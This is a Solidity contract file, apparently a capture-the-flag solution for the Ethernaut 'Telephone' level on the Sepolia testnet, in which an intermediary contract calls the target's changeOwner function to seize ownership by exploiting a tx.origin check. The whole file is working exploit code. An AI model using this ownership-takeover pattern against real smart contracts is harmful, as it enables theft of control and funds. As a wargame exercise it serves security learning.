// SPDX-License-Identifier: MIT
// https://sepolia.etherscan.io/tx/0x72ee76c9cc4c020e13f1f4e782d78762e1c504c3970aafbd971832e9172961f2

pragma solidity ^0.8.0;

import {Telephone} from "../04_Telephone/Telephone.sol";

contract TelephoneHack {
    address public owner;
    Telephone public target;

    constructor(address _target) {
        owner = msg.sender;
        target = Telephone(_target);
    }

    function attack(address _address) public {
        require(owner != target.owner(), "Attacker should be different from the target owner");
        target.changeOwner(_address);
    }
}